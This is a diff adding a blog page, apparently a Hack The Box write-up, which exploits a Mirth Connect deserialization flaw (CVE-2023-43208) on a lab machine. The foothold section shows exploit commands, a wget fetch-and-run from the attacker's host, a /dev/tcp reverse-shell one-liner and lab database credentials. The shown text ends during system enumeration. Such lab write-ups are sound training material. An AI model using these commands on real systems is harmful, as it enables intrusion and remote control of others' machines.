@@ -1,0 +1,470 @@
+<!doctype html><html lang="en"><head><title>Interpreter | 7Rocky</title><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta http-equiv="Content-Security-Policy" content><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="Hack The Box. Linux. Medium machine. This machine has a Mirth Connect instance that is vulnerable to Unauthenticated Remote Code Execution. After getting a reverse shell, we can find a database credentials and a hashed password inside. We must analyze how the hash is generated in order to crack it. Once we have the password, we can access via SSH and find out an internal webserver running as root that has a code injection vullnerability in Python due to eval and f-strings, which allows us to escalate to root"><meta name="image" content="https://7rocky.github.io/images-draft/HTB/Interpreter/Interpreter.webp"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:description" content="Hack The Box. Linux. Medium machine. This machine has a Mirth Connect instance that is vulnerable to Unauthenticated Remote Code Execution. After getting a reverse shell, we can find a database credentials and a hashed password inside. We must analyze how the hash is generated in order to crack it. Once we have the password, we can access via SSH and find out an internal webserver running as root that has a code injection vullnerability in Python due to eval and f-strings, which allows us to escalate to root"><meta name="twitter:image" content="https://7rocky.github.io/images-draft/HTB/Interpreter/Interpreter.webp"><meta name="twitter:title" content="Interpreter"><meta itemprop="description" content="Hack The Box. Linux. Medium machine. This machine has a Mirth Connect instance that is vulnerable to Unauthenticated Remote Code Execution. After getting a reverse shell, we can find a database credentials and a hashed password inside. We must analyze how the hash is generated in order to crack it. Once we have the password, we can access via SSH and find out an internal webserver running as root that has a code injection vullnerability in Python due to eval and f-strings, which allows us to escalate to root"><meta itemprop="keywords" content="cve,java,python,code-injection,port-forwarding,password-reuse,rce,hash-cracking,"><meta itemprop="name" content="Interpreter"><meta property="article:published_time" content="2026-02-21T00:00:00+00:00"><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="Hack The Box. Linux. Medium machine. This machine has a Mirth Connect instance that is vulnerable to Unauthenticated Remote Code Execution. After getting a reverse shell, we can find a database credentials and a hashed password inside. We must analyze how the hash is generated in order to crack it. Once we have the password, we can access via SSH and find out an internal webserver running as root that has a code injection vullnerability in Python due to eval and f-strings, which allows us to escalate to root"><meta property="og:image" content="https://7rocky.github.io/images-draft/HTB/Interpreter/Interpreter.webp" data-pagefind-meta="image[content]"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Interpreter"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/en/htb/interpreter/"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="https://7rocky.github.io/en/htb/interpreter/" rel="canonical"><link href="/css/main.min.f9f6c484d6925d31cc0d6bb10a9fec863cccb98b5a8c9a1b4626b947cda7dd20.css" integrity="sha256-+fbEhNaSXTHMDWuxCp/shjzMuYtajJobRia5R82n3SA=" media="screen,print" rel="stylesheet"><link href="/css/code.min.e0f19b1db32cb60b0c9e59964e5fb9174f64142e1eea186ff2efc58e9d38cca5.css" integrity="sha256-4PGbHbMstgsMnlmWTl+5F09kFC4e6hhv8u/Fjp04zKU=" media="screen,print" rel="stylesheet"><link href="/css/print.min.f1c442c427e235476cd0e3d3f95143f9afaea8e1d239fcd3cb23cc001e042141.css" integrity="sha256-8cRCxCfiNUds0OPT+VFD+a+uqOHSOfzTyyPMAB4EIUE=" media="print" rel="stylesheet"><script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","articleSection":"htb","name":"Interpreter","headline":"Interpreter","alternativeHeadline":"","description":"Hack The Box. Linux. Medium machine. This machine has a Mirth Connect instance that is vulnerable to Unauthenticated Remote Code Execution. After getting a reverse shell, we can find a database credentials and a hashed password inside. We must analyze how the hash is generated in order to crack it. Once we have the password, we can access via SSH and find out an internal webserver running as \u003ccode\u003eroot\u003c/code\u003e that has a code injection vullnerability in Python due to \u003ccode\u003eeval\u003c/code\u003e and f-strings, which allows us to escalate to \u003ccode\u003eroot\u003c/code\u003e","inLanguage":"en","isFamilyFriendly":"true","mainEntityOfPage":{"@type":"WebPage","@id":"https://7rocky.github.io/en/htb/interpreter/"},"author":{"@type":"Person","name":"7Rocky"},"creator":{"@type":"Person","name":"7Rocky"},"accountablePerson":{"@type":"Person","name":"7Rocky"},"copyrightHolder":"7Rocky","copyrightYear":"2026","dateCreated":"2026-02-21T00:00:00.00Z","datePublished":"2026-02-21T00:00:00.00Z","dateModified":"2026-02-26T18:34:08.00Z","publisher":{"@type":"Organization","name":"7Rocky","url":"https://7rocky.github.io/","logo":{"@type":"ImageObject","url":"https://7rocky.github.io/favicon.ico","width":"32","height":"32"}},"image":["https://7rocky.github.io/images-draft/HTB/Interpreter/Interpreter.webp"],"url":"https://7rocky.github.io/en/htb/interpreter/","wordCount":"2939","genre":["cve","java","python","code-injection","port-forwarding","password-reuse","rce","hash-cracking"],"keywords":["cve","java","python","code-injection","port-forwarding","password-reuse","rce","hash-cracking"]}</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1,dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes";if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script><script integrity="sha256-MkDtcuAL4B8X4G4d25jtG5zzyGXOsa6Uq6qVbZ5RSxw=" src="/js/copy-code.min.3240ed72e00be01f17e06e1ddb98ed1b9cf3c865ceb1ae94abaa956d9e514b1c.js"></script></head><body class="ma0 production"><header class="bg-black p-sticky t-0 z-999"><nav class="ph4-ns flex-l justify-between items-center center" role="navigation" data-pagefind-ignore="all"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" id="search-link" target class="link-transition link dib z-999 pt3 pt0-l mr1 absolute" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
+</a><a class="lang link-transition link dib z-999 pt3 pt0-l mr3" href="/htb/interpreter/" title="es" data-pagefind-ignore="all"><img alt="es" class="br-100 selected-lang" height="30px" src="/images/es.svg" width="30px">
+</a><a class="lang link-transition link dib z-999 pt3 pt0-l" href="#" title="en" data-pagefind-ignore="all"><img alt="en" height="30px" src="/images/en.svg" width="30px"></a><ul class="pl0 ml3 mr3"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a aria-label="follow on LinkedIn——Opens in a new window" class="link-transition link linkedin dib z-999 pt3 pt0-l mr1" href="https://www.linkedin.com/in/roberto-gesteira-minarro/" rel="noopener" target="_blank" title="LinkedIn link" data-pagefind-ignore="all"><svg height="30" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+<span class="new-window dib"><svg height="8" style="enable-background:new 0 0 1e3 1e3" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span></a><a aria-label="follow on GitHub——Opens in a new window" class="github link-transition link dib z-999 pt3 pt0-l mr1" href="https://github.com/7Rocky" target="_blank" title="GitHub link" rel="noopener" data-pagefind-ignore="all"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
+<span class="new-window dib"><svg height="8" style="enable-background:new 0 0 1e3 1e3" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></nav></header><main class="pb5" role="main"><div id="progress-bar-container"><div id="progress-bar"></div></div><style>#progress-bar-container{position:fixed;top:0;left:0;width:100%;height:5px;background:0 0;z-index:9999}#progress-bar{height:100%;background:#357edd;width:0%;transition:width .1s ease-out}</style><script>window.addEventListener("scroll",function(){var e=document.body.scrollTop||document.documentElement.scrollTop,t=document.documentElement.scrollHeight-document.documentElement.clientHeight,n=e/t*100;document.getElementById("progress-bar").style.width=n+"%"})</script><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a id="back" class="b tracked f4" href="../" title="HTB" data-pagefind-ignore="all">&lt;- HTB</a><div id="sharing" class="mt3" data-pagefind-ignore="all"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/interpreter/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
+</a><a aria-label="share on X" class="x-twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/interpreter/&amp;text=Interpreter" title="share on X"><svg height="32" style="enable-background:new -4 -4 71 71" viewBox="-4 -4 71 71" width="32"><defs><mask id="x-mask"><rect width="100%" height="100%" fill="#fff"/><path d="M714.163 519.284 1160.89.0H1055.03L667.137 450.887 357.328.0H0L468.492 681.821.0 1226.37H105.866L515.491 750.218 842.672 1226.37H12e2L714.137 519.284H714.163zM569.165 687.828l-47.468-67.894L144.011 79.6944H306.615L611.412 515.685l47.468 67.894 396.2 566.721H892.476L569.165 687.854V687.828z" fill="#000" transform="translate(17, 17) scale(0.025)"/></mask></defs><circle cx="32" cy="32" r="32" mask="url(#x-mask)"/></svg>
+</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/htb/interpreter/&amp;title=Interpreter" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Interpreter</h1><time class="mt4 f6 dib tracked" data-pagefind-ignore="all" datetime="2026-02-21T00:00:00+01:00">21 / 02 / 2026</time><br><p class="mb4 f6 dib tracked" data-pagefind-ignore="all">14 minutes to read</p></header><div class="fl" id="htb-image"><img alt="Interpreter" src="/images-draft/HTB/Interpreter/Interpreter.webp"><br><div class="htb-description bg-card">Hack The Box. Linux. Medium machine. This machine has a Mirth Connect instance that is vulnerable to Unauthenticated Remote Code Execution. After getting a reverse shell, we can find a database credentials and a hashed password inside. We must analyze how the hash is generated in order to crack it. Once we have the password, we can access via SSH and find out an internal webserver running as <code>root</code> that has a code injection vullnerability in Python due to <code>eval</code> and f-strings, which allows us to escalate to <code>root</code></div></div><ul class="nested-links" id="tags" data-pagefind-ignore="all"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/cve" title="CVE">CVE</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/java" title="Java">Java</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/python" title="Python">Python</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/code-injection" title="Code Injection">Code Injection</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/port-forwarding" title="Port forwarding">Port forwarding</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/password-reuse" title="Password reuse">Password reuse</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/rce" title="Remote Code Execution">Remote Code Execution</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/hash-cracking" title="Password hash cracking">Password hash cracking</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l" id="aside-mobile"><section id="toc" class="bg-card pa3 pb0 p-sticky" data-pagefind-ignore="all"><p class="b pb2 ma0">Contents</p><ul class="nested-list-reset nested-copy-line-height nested-links"><li><a href="#port-scanning" title="port-scanning">Port scanning</a></li><li><a href="#enumeration" title="enumeration">Enumeration</a></li><li><a href="#foothold" title="foothold">Foothold</a></li><li><a href="#system-enumeration" title="system-enumeration">System enumeration</a></li><li><a href="#lateral-movement-to-sedric" title="lateral-movement-to-sedric">Lateral movement to <code>sedric</code></a></li><li><a href="#privilege-escalation" title="privilege-escalation">Privilege escalation</a><ul><li><a href="#python-code-injection" title="python-code-injection">Python code injection</a></li></ul></li></ul><div class="pv2 white" id="bmc"><a class="pointer no-underline white" target="_blank" href="http://buymeacoffee.com/7Rocky" title="Buy me a beer">🍺&nbsp; Buy me a beer</a></div></section></aside><section class="f4 serif nested-links nested-img w-80-l pr4-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Medium</li><li><strong>IP Address</strong>: 10.129.6.63</li><li><strong>Release</strong>: 21 / 02 / 2026</li></ul><h2 id="port-scanning">Port scanning</h2><div class="code-container" style="position:relative"><div class="highlight" data-pagefind-ignore="all"><code class="ma0 pa0 white"><pre class="ccode" tabindex="0">
+# Nmap 7.98 scan initiated as: nmap -sC -sV -o nmap/targeted 10.129.6.63 -p 22,80,443,6661
+Nmap scan report for 10.129.6.63
+Host is up (0.090s latency).
+
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+| ssh-hostkey:
+|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
+|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
+80/tcp   open  http     Jetty
+|_http-title: Mirth Connect Administrator
+| http-methods:
+|_  Potentially risky methods: TRACE
+443/tcp  open  ssl/http Jetty
+|_http-title: Mirth Connect Administrator
+| http-methods:
+|_  Potentially risky methods: TRACE
+| ssl-cert: Subject: commonName=mirth-connect
+| Not valid before: 2025-09-19T12:50:05
+|_Not valid after:  2075-09-19T12:50:05
+|_ssl-date: TLS randomness does not represent time
+6661/tcp open  unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done -- 1 IP address (1 host up) scanned in 185.62 seconds
+</pre></code></div><button class="copy-code-btn" aria-label="Copy code">
+<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-copy"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button></div><p>This machine has ports 22 (SSH), 80, 443 (HTTPS) and 6661 open.</p><h2 id="enumeration">Enumeration</h2><p>If we go to <code>http://10.129.6.63</code>, we will see this webpage:</p><p><img src="/images-draft/HTB/Interpreter/Interpreter-1.webp" alt="Interpreter 1"></p><p>With this single webpage, we can start looking for vulnerabilities. A quick search shows that Mirth Connect can be vulnerable to <a target="_blank" href="https://nvd.nist.gov/vuln/detail/CVE-2023-37679">CVE-2023–37679</a> and <a target="_blank" href="https://nvd.nist.gov/vuln/detail/CVE-2023-43208">CVE-2023-43208</a>, which is an Unauthenticated Remote Code Execution vulnerability. The original disclosure is in <a target="_blank" href="https://horizon3.ai/attack-research/disclosures/nextgen-mirth-connect-remote-code-execution/">horizon3.ai</a>, although there is no proof of concept.</p><p>There are two other posts related to Mirth Connect vulnerabilities:</p><ul><li><a target="_blank" href="https://vsociety.medium.com/rce-in-mirth-connect-pt-i-cve-2023-37679-a3ae6b3a284b">RCE in Mirth Connect — pt. I. (CVE-2023–37679)</a></li><li><a target="_blank" href="https://vsociety.medium.com/rce-in-mirth-connect-pt-ii-cve-2023-43208-35878e3b0a7c">RCE in Mirth Connect — pt. II. (CVE-2023–43208)</a></li></ul><p>As mentioned in the posts, we can check the version of Mirth Connect using this <code>curl</code> command:</p><div class="highlight" data-pagefind-ignore="all"><code class="ma0 pa0 white"><pre class="cconsole" tabindex="0">
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -k -H <span class="code-dark-yellow">'X-Requested-With: OpenAPI'</span> https://10.129.6.63/api/server/version
+4.4.0
+</pre></code></div><h2 id="foothold">Foothold</h2><p>So, we will need to use <a target="_blank" href="https://nvd.nist.gov/vuln/detail/CVE-2023-43208">CVE-2023-43208</a> to get RCE, because the previous CVE only applies up to version 4.3.0. The post shows a proof of concept of the exploit, which we can use to get RCE. The vulnerability is related to Java insecure deserialization in XML. There is a proof of concept XML document where we can specify the command to run. But there is a handy Python script that runs everything automatically:</p><div class="highlight" data-pagefind-ignore="all"><code class="ma0 pa0 white"><pre class="cconsole" tabindex="0">
+<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">exploit.py</span> -c <span class="code-dark-yellow">'whoami'</span> -u http://10.129.6.63 -p unix
+Failed to execute the payload.
+
+<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">exploit.py</span> -c <span class="code-dark-yellow">'whoami'</span> -u https://10.129.6.63 -p unix
+/opt/homebrew/lib/python3.14/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host '10.129.6.63'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
+  warnings.warn(
+The target appears to have executed the payload.
+</pre></code></div><p>Remember that the machine is using HTTP and HTTPS (both show apparently the same website). For some reason, the exploit seems to work over HTTPS and not over HTTP.</p><p>In any case, it looks that the command execution is blind, as we don&rsquo;t see any result. Therefore, we can check if it is actually executing something by running <code>curl</code> or <code>wget</code> to get a hit on our server:</p><div class="highlight" data-pagefind-ignore="all"><code class="ma0 pa0 white"><pre class="cconsole" tabindex="0">
+<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">exploit.py</span> -c <span class="code-dark-yellow">'wget 10.10.16.176'</span> -u https://10.129.6.63 -p unix
+/opt/homebrew/lib/python3.14/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host '10.129.6.63'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
+  warnings.warn(
+The target appears to have executed the payload.
+</pre></code></div><p>And we receive a hit:</p><div class="highlight" data-pagefind-ignore="all"><code class="ma0 pa0 white"><pre class="cconsole" tabindex="0">
+<span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 80
+Ncat: Version 7.98 ( https://nmap.org/ncat )
+Ncat: Listening on [::]:80
+Ncat: Listening on 0.0.0.0:80
+Ncat: Connection from 10.129.6.63:52390.
+GET / HTTP/1.1
+Host: 10.10.16.176
+User-Agent: Wget/1.21.3
+Accept: */*
+Accept-Encoding: identity
+Connection: Keep-Alive
+</pre></code></div><p>At this point, we can try to get a reverse shell on the system. I tried some reverse shell commands, and none worked. Probably due to the use of pipes. Instead, what I did was to use <code>wget</code> to download a bash script that spawns a reverse shell, and then execute it:</p><div class="highlight" data-pagefind-ignore="all"><code class="ma0 pa0 white"><pre class="cconsole" tabindex="0">
+<span class="code-cyan">$</span> <span class="code-dark-green">echo</span> <span class="code-dark-yellow">'bash -i &gt;& /dev/tcp/10.10.16.176/4444 0&gt;&1'</span> <span class="code-dark-yellow">&gt;</span> rev.sh
+
+<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...
+::ffff:10.129.6.63 - - [26/Feb/2026 17:07:02] "GET /rev.sh HTTP/1.1" 200 -
+</pre></code></div><div class="highlight" data-pagefind-ignore="all"><code class="ma0 pa0 white"><pre class="cconsole" tabindex="0">
+<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">exploit.py</span> -c <span class="code-dark-yellow">'wget 10.10.16.176/rev.sh'</span> -u https://10.129.6.63 -p unix
+/opt/homebrew/lib/python3.14/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host '10.129.6.63'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
+  warnings.warn(
+The target appears to have executed the payload.
+
+<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">exploit.py</span> -c <span class="code-dark-yellow">'bash rev.sh'</span> -u https://10.129.6.63 -p unix
+/opt/homebrew/lib/python3.14/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host '10.129.6.63'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
+  warnings.warn(
+The target appears to have executed the payload.
+</pre></code></div><p>With this, we get a reverse shell:</p><div class="highlight" data-pagefind-ignore="all"><code class="ma0 pa0 white"><pre class="cconsole" tabindex="0">
+<span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
+Ncat: Version 7.98 ( https://nmap.org/ncat )
+Ncat: Listening on [::]:4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.129.6.63:49020.
+bash: cannot set terminal process group (3551): Inappropriate ioctl for device
+bash: no job control in this shell
+mirth@interpreter:/usr/local/mirthconnect$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+&lt;ct$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+mirth@interpreter:/usr/local/mirthconnect$ ^Z
+zsh: suspended  ncat -nlvp 4444
+
+<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
+[1]  + continued  ncat -nlvp 4444
+                                 reset xterm
+mirth@interpreter:/usr/local/mirthconnect$ export TERM=xterm SHELL=/bin/bash
+mirth@interpreter:/usr/local/mirthconnect$ stty rows 59 cols 238
+</pre></code></div><h2 id="system-enumeration">System enumeration</h2><p>A quick enumeration of the configuration files for Mirth Connect shows credentials to a MariaDB database:</p><div class="highlight" data-pagefind-ignore="all"><code class="ma0 pa0 white"><pre class="cconsole" tabindex="0">
+mirth@interpreter:/usr/local/mirthconnect$ ls -la
+total 148
+drwxr-xr-x 14 mirth mirth  4096 Feb 26 11:07 .
+drwxr-xr-x 11 root  root   4096 Feb 16 15:42 ..
+drwxr-xr-x  2 mirth mirth  4096 Feb 16 15:42 client-lib
+drwxr-xr-x  2 mirth mirth  4096 Feb 16 15:42 conf
+drwxr-xr-x  2 mirth mirth  4096 Feb 16 15:42 custom-lib
+drwxr-xr-x  4 mirth mirth  4096 Feb 16 15:42 docs
+drwxr-xr-x 43 mirth mirth  4096 Feb 16 15:42 extensions
+drwxr-xr-x  3 mirth mirth  4096 Feb 16 15:42 .install4j
+drwxr-xr-x  2 mirth mirth  4096 Feb 16 15:42 logs
+-rwxr-xr-x  1 mirth mirth 14867 Jul 18  2023 mcserver
+-rwxr-xr-x  1 mirth mirth    69 Jul 18  2023 mcserver.vmoptions
+-rwxr-xr-x  1 mirth mirth 18320 Jul 18  2023 mcservice
+-rwxr-xr-x  1 mirth mirth    69 Jul 18  2023 mcservice.vmoptions
+-rwxr-xr-x  1 mirth mirth 16803 Jul 18  2023 mirth-server-launcher.jar
+-rwxr-xr-x  1 mirth mirth  1261 Sep 19 08:49 preferences
+drwxr-xr-x  7 mirth mirth  4096 Feb 16 15:42 public_api_html
+drwxr-xr-x  6 mirth mirth  4096 Feb 16 15:42 public_html
+-rw-r--r--  1 mirth mirth    43 Feb 26 11:06 rev.sh
+drwxr-xr-x  2 mirth mirth  4096 Feb 16 15:42 server-launcher-lib
+drwxr-xr-x 14 mirth mirth  4096 Feb 16 15:42 server-lib
+-rwxr-xr-x  1 mirth mirth 16765 Jul 18  2023 uninstall
+drwxr-xr-x  2 mirth mirth  4096 Feb 16 15:42 webapps
+mirth@interpreter:/usr/local/mirthconnect$ ls -la conf
+total 24
+drwxr-xr-x  2 mirth mirth 4096 Feb 16 15:42 .
+drwxr-xr-x 14 mirth mirth 4096 Feb 26 11:07 ..
+-rwxr-xr-x  1 mirth mirth 1438 Jul 18  2023 dbdrivers.xml
+-rwxr-xr-x  1 mirth mirth 2229 Sep 19 08:49 log4j2.properties
+-rwxr-xr-x  1 mirth mirth 4848 Feb 26 10:16 mirth.properties
+mirth@interpreter:/usr/local/mirthconnect$ cat conf/mirth.properties | grep database
+database = mysql
+#   Microsoft SQL Server        jdbc:sqlserver://localhost:1433;databaseName=mirthdb
+#   If you are using the Microsoft SQL Server driver, please also specify database.driver below
+database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
+# Microsoft SQL server: database.driver = com.microsoft.sqlserver.jdbc.SQLServerDriver
+database.driver = org.mariadb.jdbc.Driver
+database.max-connections = 20
+database-readonly.max-connections = 20
+# database credentials
+database.username = mirthdb
+database.password = MirthPass123!
+#On startup, Maximum number of retries to establish database connections in case of failure
+database.connection.maxretry = 2
+#On startup, Maximum wait time in milliseconds for retry to establish database connections in case of failure
+database.connection.retrywaitinmilliseconds = 10000
+# but you can change this with the "database-readonly" options. For example, to point the
+# database-readonly.url = jdbc:...
